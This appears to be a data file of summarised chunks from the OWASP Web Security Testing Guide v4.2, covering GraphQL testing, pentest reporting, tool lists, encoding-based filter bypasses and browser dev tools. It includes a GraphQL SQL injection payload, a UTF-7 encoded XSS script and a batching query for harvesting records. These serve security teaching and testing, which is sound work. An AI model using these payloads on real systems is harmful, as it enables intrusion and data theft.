INTERFACE, and UNION.\nEach type kind has specific descriptions explaining their roles within a GraphQL schema.\nThe provided code includes a structure for both a kind of type and examples of enum values along with their descriptions.\nGraphQL Voyager is a tool for visualizing GraphQL schemas through Entity Relationship Diagrams (ERDs).\nGraphQL Voyager only displays certain aspects of the GraphQL schema, such as queries, but does not include available mutations.\nGraphiQL is a web-based IDE for GraphQL, mainly used for debugging and development, which should not be exposed in production environments.\nGraphiQL includes a documentation section that utilizes the schema data to provide information about data types, mutations, and other aspects of the GraphQL instance."}
{"id": "WSTGv4_2-00172", "source": "wstg-v4.2_knowledge.json", "start_item": 2931, "end_item": 2948, "text": " debugging and development, which should not be exposed in production environments.\nGraphiQL includes a documentation section that utilizes the schema data to provide information about data types, mutations, and other aspects of the GraphQL instance.\nGraphQL Playground is a GraphQL client that allows for testing queries, managing multiple playgrounds, and generating documentation without manual introspection queries.\nGraphQL Playground can be used without the GraphiQL interface and can be directed to a GraphQL endpoint via URL or used locally.\nWhen testing with GraphQL tools, it may be necessary to set HTTP headers to include session IDs or authentication mechanisms.\nImage: img_page431_1.png\nThe page references a guide on web security testing, specifically version 4.2.\nThere are figures mentioned which likely contain important visual information, specifically related to GraphQL Playground API documentation and schema.\nImage: img_page432_1.png\nImage: img_page432_2.png\nIntrospection in GraphQL can expose sensitive information and should be limited in access to prevent data extraction by malicious users.\nAuthorization problems can often be identified through introspection, as it reveals the schema and potentially sensitive queries.\nGraphQL does not enforce permissions by default; it is the responsibility of the application to implement authorization controls.\nAn example of a vulnerability is when unauthenticated users can access sensitive information such as authentication tokens for veterinarians.\nTesting authorization varies between different deployments due to distinct schemas and sensitive data targets.\nExample of a query demonstrating broken access control where an extracted token is used improperly to access data that should be restricted.\nImage: img_page433_1.png\nAll dogs in the list belong to Benoit, highlighting potential authorization enforcement issues.\nGraphQL can forward requests directly to APIs or databases, making it susceptible to various types of injections such as SQL injection and command injection.\nCustom scalars in GraphQL, like DateTime, lack built-in validation, making them vulnerable to testing."}
{"id": "WSTGv4_2-00173", "source": "wstg-v4.2_knowledge.json", "start_item": 2949, "end_item": 2964, "text": "n forward requests directly to APIs or databases, making it susceptible to various types of injections such as SQL injection and command injection.\nCustom scalars in GraphQL, like DateTime, lack built-in validation, making them vulnerable to testing.\nConcatenating user input into SQL queries can lead to vulnerabilities such as SQL injection. The example uses a concatenated string that can exploit the database query.\nExample of a vulnerable GraphQL query that concatenates user input: dogs(namePrefix: \"ab%' UNION ALL SELECT 50 AS ID, C.CFGVALUE AS NAME, NULL AS VETERINARY_ID FROM CONFIG C LIMIT ? -- \").\nExample response to the SQL injection query showing the structure of returned data.\nThe document discusses security vulnerabilities related to web applications, specifically focusing on Cross-Site Scripting (XSS).\nIt provides code examples illustrating JWT signing secrets and how sensitive information can be exploited.\nIt emphasizes the importance of understanding the application's structure and database organization for effective security testing.\nTools like sqlmap can be utilized to detect and exploit SQL injection vulnerabilities.\nA payload example is given to demonstrate how XSS can be tested by inserting script tags into user input.\nA hypothetical response shows the validation error encountered when XSS payloads are used improperly within specific argument types.\nGraphQL allows for nested queries which can lead to Denial of Service (DoS) attacks by consuming excessive CPU and memory resources.\nA deep nested query can overload the application, leading to service disruption.\nExample of a potentially abusive query is provided, illustrating a deeply nested structure that could cause DoS.\nSecurity measures can be implemented to prevent abusive nested queries in GraphQL deployments.\nGraphQL supports batching of multiple queries in a single request for efficiency.\nBatching attacks can be executed by sending multiple queries in one request, potentially bypassing security measures like web application firewalls.\nAn attacker could use batch queries to extract sensitive information such as veterinary names and access tokens."}
{"id": "WSTGv4_2-00174", "source": "wstg-v4.2_knowledge.json", "start_item": 2965, "end_item": 2979, "text": "tacks can be executed by sending multiple queries in one request, potentially bypassing security measures like web application firewalls.\nAn attacker could use batch queries to extract sensitive information such as veterinary names and access tokens.\nAn example of sending batch queries is provided, showing how to pull multiple veterinary names using their IDs:\n```code | query { | | --- | | Veterinary(id: \"1\") { | | name | | } | | second:Veterinary(id: \"2\") { | | name | | } | | third:Veterinary(id: \"3\") { | | name | | } | | } | ```\nBatching attacks may allow for efficient brute force attempts without detection due to reduced request rates.\nDetailed error messages can expose internal application information when unexpected errors occur, and this can be exploited during security testing.\nThe process of checking error messages for sensitive information is known as fuzzing.\nGraphQL is a modern technology that can be exploited if underlying APIs do not properly check for authorization.\nImproper handling of GraphQL requests may lead to privilege escalation.\nExample of a risky request: `id=1/delete` may be interpreted as `/api/users/1/delete`.\nTesters should aim to access underlying API methods to check for escalation of privileges.\nRecommended remediations include restricting access to introspection queries and implementing input validation using `graphql-constraint-directive`.\nMitigations against injection attacks include: managing timeouts, restricting maximum query depth and complexity, server-time-based throttling, and generic error messaging.\nTo prevent batching attacks, implement request rate limits, prevent batching for sensitive objects, and limit concurrent queries.\nTools for testing vulnerabilities in GraphQL include GraphQL Playground, GraphQL Voyager, sqlmap, InQL (Burp Extension), and GraphQL Raider (Burp Extension).\nPerforming technical assessments is only part of the overall assessment process, with the final product being an informative report.\nA report should be easy to understand and must highlight risks found during the assessment phase, appealing to both executive management and technical staff."}
{"id": "WSTGv4_2-00175", "source": "wstg-v4.2_knowledge.json", "start_item": 2980, "end_item": 2996, "text": " part of the overall assessment process, with the final product being an informative report.\nA report should be easy to understand and must highlight risks found during the assessment phase, appealing to both executive management and technical staff.\nThis guide provides suggestions for reporting, but they are not strict rules and should be adapted to improve understanding.\nSecure and encrypt the report to ensure confidentiality for the receiving party.\nA good report enhances client understanding of findings and reflects the quality of technical testing. If the client cannot understand the findings, the quality of testing is irrelevant.\nVersion control is essential for tracking changes in reports and is presented in a table format.\nKey elements of a report include the introduction, table of contents, team details, scope, limitations, and timeline.\nImportance of providing a disclaimer for security tests and consulting a legal professional.\nNature of security tests being a 'point in time' assessment, with no guarantee of completeness in identifying vulnerabilities.\nExecutive summary should communicate the objective of the test, business needs, and key findings in a non-technical manner.\nThe findings section is aimed at technical teams and should enable replication and resolution of identified vulnerabilities.\nUse of risk levels to summarize findings, including examples like User Authentication Bypass being categorized as High risk.\nDetails for each finding should include Reference ID, title of vulnerability, likelihood of exploitation, impact, and suggested risk values ranging from Informational to Critical.\nImportance of including a CVSS score in security reports where applicable.\nVulnerability descriptions should explain exploitation methods and potential damage.\nSensitive data should be masked in reports to protect personal information.\nDetailed step-by-step remediation strategies should be included for vulnerabilities.\nAdditional educational resources such as images, videos, and external guides should be provided to aid understanding.\nTechnical descriptions must be thorough to enable engineers to take actionable steps based on findings."}
{"id": "WSTGv4_2-00176", "source": "wstg-v4.2_knowledge.json", "start_item": 2997, "end_item": 3015, "text": "ncluded for vulnerabilities.\nAdditional educational resources such as images, videos, and external guides should be provided to aid understanding.\nTechnical descriptions must be thorough to enable engineers to take actionable steps based on findings.\nAppendices can include test methodologies, severity ratings, and relevant tool outputs for transparency.\nA checklist of tests conducted (like the WSTG checklist) should be included as attachments to the report.\nThe Zed Attack Proxy (ZAP) is an integrated tool for penetration testing focused on finding web application vulnerabilities.\nZAP is suitable for users with varied experience in security, making it ideal for beginners in penetration testing.\nBurp Proxy is an intercepting proxy server that allows users to modify all HTTP(S) traffic, which is essential for security testing of web applications.\nFirefox HTTP Header Live helps in viewing HTTP headers of webpages during browsing.\nFirefox Tamper Data allows users to view and modify HTTP/HTTPS headers and post parameters.\nw3af is a web application attack and audit framework aimed at finding and exploiting vulnerabilities.\nSession Manager is a tool that helps in managing browser sessions effectively.\nTesting for specific vulnerabilities includes testing for JavaScript security and SQL Injection, with tools like sqlmap and O-Saft.\nTesting SSL can be done using tools like sslyze and TestSSLServer.\nSSLScan and SSLLabs are tools for assessing SSL/TLS implementations.\nJohn the Ripper and HashCat are password cracking tools designed for testing password strength.\nRemote brute force tools listed include Patator and THC Hydra for testing password weaknesses remotely.\nOllyDbg is a debugger used to analyze buffer overflow vulnerabilities in software.\nSpike is a fuzzer framework used to identify vulnerabilities and perform length testing.\nMetasploit is a framework for rapid exploit development and testing.\nWfuzz is a fuzzer tool utilized for web application security testing.\nBishop Fox’s Google Hacking Diggity Project and Google Hacking database provide methodologies for searching vulnerabilities via Google."}
{"id": "WSTGv4_2-00177", "source": "wstg-v4.2_knowledge.json", "start_item": 3016, "end_item": 3029, "text": "k for rapid exploit development and testing.\nWfuzz is a fuzzer tool utilized for web application security testing.\nBishop Fox’s Google Hacking Diggity Project and Google Hacking database provide methodologies for searching vulnerabilities via Google.\nCommercial black-box testing tools include Burp Intruder, HCL AppScan, and others designed for comprehensive security testing of applications.\nKali Linux is a specialized Linux distribution used for penetration testing and security assessments.\nList of Open Source / Freeware Security Testing Tools: Parrot, Samurai, Santoku, BlackArch, PenToo, Spotbugs, Find Security Bugs, FlawFinder, phpcs-security-audit, PMD, Microsoft’s FxCop, SonarQube, W3af.\nList of Commercial Security Testing Tools: Checkmarx CxSuite, GrammaTech, ITS4, ParaSoft, Virtual Forge CodeProfiler for ABAP, Veracode, Peach Fuzzer, Burp Suite, Fortify SCA.\nCode defining Acceptance Testing Tools: \"Acceptance testing tools are used to validate the functionality of web applications. Some follow a scripted approach and typically make use of a Unit Testing framework to construct test suites and test cases. Most, if not all, can be adapted to perform security specific tests in addition to functional tests.\"\nOpen Source BDD (Behavior Driven Development) Security tools: HtmlUnit (\"A Java and JUnit based framework that uses the Apache HttpClient as the transport.\") and Selenium (\"JavaScript based testing framework, cross-platform and provides a GUI for creating tests.\").\nMention of Binary Analysis Tools: Veracode.\nMention of Site Mirroring tool: wget.\nFuzzing vectors can be used with ZAP, Burp Suite, or other testing tools.\nFuzzing is a 'kitchen sink' approach to testing application responses to parameter manipulation.\nAnalysts look for error conditions or abnormal behaviors during fuzzing.\nImportant resources for fuzzing include:\nCross-site scripting (XSS) cheat sheet, AwesomeXSS, Payloads All The Things, Big List of Naughty Strings, Bo0oM Fuzz List, FuzzDB, bl4de Dictionaries, Open Redirect Payloads, EdOverflow Bug Bounty Cheat Sheet, Daniel Miessler - SecLists, XssPayloads Twitter Feed.\nCharacter encoding maps characters to a standard format for transmission."}
{"id": "WSTGv4_2-00178", "source": "wstg-v4.2_knowledge.json", "start_item": 3030, "end_item": 3049, "text": "f Naughty Strings, Bo0oM Fuzz List, FuzzDB, bl4de Dictionaries, Open Redirect Payloads, EdOverflow Bug Bounty Cheat Sheet, Daniel Miessler - SecLists, XssPayloads Twitter Feed.\nCharacter encoding maps characters to a standard format for transmission.\nCommon encoding schemes include ASCII, UTF-8, and UTF-16.\nImproper use of character encoding can allow malicious injection strings to bypass input validation filters.\nWeb applications use input filtering mechanisms to restrict user input, but inadequate filters can be bypassed using encoding tactics.\nA character like '/' can be encoded in different ways (e.g., hex 2F in ASCII, C0 AF in Unicode).\nBrowsers must be aware of the encoding scheme to display web pages correctly, indicated in HTTP headers or HTML META tags.\nThe HTTP header's Content-Type field specifies the character encoding; if ignored, the default could lead to inconsistent behavior.\nIf character encoding isn't specified, it can lead to reliance on browser defaults, which may vary.\nThe browser may guess character encoding if not provided by the server, which can lead to mismatched interpretations of web pages.\nEncoded injections can bypass input filters depending on the browser used.\nBasic input validation filters can be bypassed using encoded JavaScript functions like `String.fromCharCode`.\nHTML character entities can be used to avoid detection from filtering, such as using `&quot;` for quotes.\nHex encoding is a method of obfuscation that uses base 16 to represent characters, making it a technique to bypass filters.\nEncoding schemes like Base64 and Octal can be useful for obfuscation in web security.\nTrial and error may help uncover weaknesses in input validation filters.\nUTF-7 encoding example provided, illustrating script embedding:\n```code | < SCRIPT > | | --- | | alert(‘XSS’); | | </ SCRIPT > | ```\nUTF-7 encoded output of the script:\n```code +ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4- ```\nThe browser must interpret the web page as UTF-7 for the encoding to work effectively.\nMulti-byte encoding utilizes varying byte lengths for character representation, which is useful for languages with large character sets like Chinese, Japanese, and Korean."}
{"id": "WSTGv4_2-00179", "source": "wstg-v4.2_knowledge.json", "start_item": 3050, "end_item": 3069, "text": "ser must interpret the web page as UTF-7 for the encoding to work effectively.\nMulti-byte encoding utilizes varying byte lengths for character representation, which is useful for languages with large character sets like Chinese, Japanese, and Korean.\nHistorical use of multi-byte encoding to bypass input validation functions, enabling cross-site scripting and SQL injection attacks.\nThe OWASP Web Security Testing Guide originated in 2003 with Dan Cuthbert as an original editor.\nThe guide has undergone several revisions, with version 4 released in 2014 and point releases continuing up to 2020.\nLeadership of the project has changed hands over the years, with notable leads including Matteo Meucci and Andrew Muller.\nA comprehensive list of authors and reviewers is provided for version 4, showcasing contributions from various individuals in the field of web security.\nThis appendix details the use of in-browser Developer Tool functionality for security testing activities.\nDev Tools is not a substitute for DAST or SAST tools, but can aid in certain testing activities.\nVarious methods to open Dev Tools are provided, including keyboard shortcuts and context menus.\nThe capabilities of Dev Tools vary between browsers, specifically Chrome, Firefox, Edge/IE, and Safari.\nKey functionalities include User-Agent switching, cookie editing, local storage editing, disabling CSS and JavaScript, viewing HTTP headers, taking screenshots, and responsive design mode.\nCode snippets are provided for functionalities to disable JavaScript and view HTTP headers.\nTesting for Browser Cache Weaknesses in Google Chrome\nSteps to change user agent in Google Chrome Dev Tools:\n1. Click on triple dot ‘kabob’ menu on the right side of the Developer Tools pane, select More tools then select Network conditions.\n2. Un-check the “Select automatically” checkbox.\n3. Select the user agent from dropdown menu or enter a custom user agent.\nIncludes an image reference for user-agent switching functionality in Google Chrome.\nImage: img_page457_1.png\nInstructions for configuring the user agent in Mozilla Firefox using the about:config page.\nSteps to set, remove and switch User-Agent strings in Firefox."}
{"id": "WSTGv4_2-00180", "source": "wstg-v4.2_knowledge.json", "start_item": 3070, "end_item": 3092, "text": "age reference for user-agent switching functionality in Google Chrome.\nImage: img_page457_1.png\nInstructions for configuring the user agent in Mozilla Firefox using the about:config page.\nSteps to set, remove and switch User-Agent strings in Firefox.\nReference to an image demonstrating Firefox User-Agent switching functionality.\nGuidelines for editing and resending HTTP requests in web applications using the Network tab in Firefox.\nProcedure for right-clicking the HTTP request to modify it before resending it.\nInitial steps for cookie editing using Google Chrome, including expanding Cookies under Storage.\nImage: img_page458_1.png\nInstructions for editing cookies in Mozilla Firefox and Google Chrome.\nSteps for accessing cookie storage in web browsers.\nCode snippets for selecting a domain name and editing cookie values.\nKey notes on deleting cookies and adding/removing storage entries via context menus.\nMention of Local Storage and session storage editing steps.\nImage reference for Mozilla Firefox cookie editing functionality.\nImage: img_page459_1.png\nMajor browsers support manipulating CSS using Dev Tools Console and JavaScript functionality.\nCode to remove all external style-sheets: `$('style,link[rel=\"stylesheet\"]').remove();`\nCode to remove all internal style-sheets: `$('style').remove();`\nCode to remove all in-line styles: `Array.prototype.forEach.call(document.querySelectorAll('*'),function(el){el.removeAttribute('style');});`\nCode to remove everything from head tag: `$('head').remove();`\nInstructions for disabling JavaScript in Google Chrome: Go to the triple dot menu > Settings > Preferences > Debugger > Disable JavaScript checkbox.\nInstructions for disabling JavaScript in Mozilla Firefox: In the Debugger tab, click the gear button > Select Disable JavaScript from the dropdown.\nInstructions for viewing HTTP headers in Google Chrome: In Dev Tools, go to Networking tab, select a URL or request, and then select the Headers tab in the lower right hand pane.\nFigure 6.F-4 displays the headers view in Google Chrome, which is essential for understanding web security testing.\nImage: img_page461_1.png\nDescribes web security testing using browser tools."}
{"id": "WSTGv4_2-00181", "source": "wstg-v4.2_knowledge.json", "start_item": 3093, "end_item": 3116, "text": "then select the Headers tab in the lower right hand pane.\nFigure 6.F-4 displays the headers view in Google Chrome, which is essential for understanding web security testing.\nImage: img_page461_1.png\nDescribes web security testing using browser tools.\nInstructions for using Mozilla Firefox Developer Tools for inspecting network requests and headers.\nCapturing screenshots in Google Chrome and Mozilla Firefox.\nUsing offline mode in Google Chrome and Mozilla Firefox for testing.\nImage: img_page462_1.png\nImage: img_page462_2.png\nFigure referencing Mozilla Firefox Offline Option\nImportance of encoding and decoding in Web Application Security Testing\nJavaScript functions for encoding and decoding:\nBase64 encode: `btoa(\"string-to-encode\")`\nBase64 decode: `atob(\"string-to-decode\")`\nURL encode: `encodeURIComponent(\"string-to-encode\")`\nURL decode: `decodeURIComponent(\"string-to-decode\")`\nHTML encode: `escape(\"string-to-encode\")`\nHTML decode: `unescape(\"string-to-decode\")`\nMention of Responsive Design Mode for related testing\nTesting browser cache weaknesses\nTesting for weaker authentication in alternative channel\nImage: img_page463_1.png\nTesting for Clickjacking involves using the Toggle device toolbar in Google Chrome and the Responsive Design Mode in Mozilla Firefox to replicate potential attack scenarios.\nTo access the Toggle device toolbar in Google Chrome, use the shortcut ctrl + shift + m.\nTo access the Responsive Design Mode in Mozilla Firefox, use the same shortcut ctrl + shift + m.\nReferences and external resources include Black Hills Information Security's webcast on developer tools and Greg Malcolm's insights on Chrome Developer Tools.\nImage: img_page464_1.png\nImage: img_page464_2.png"}
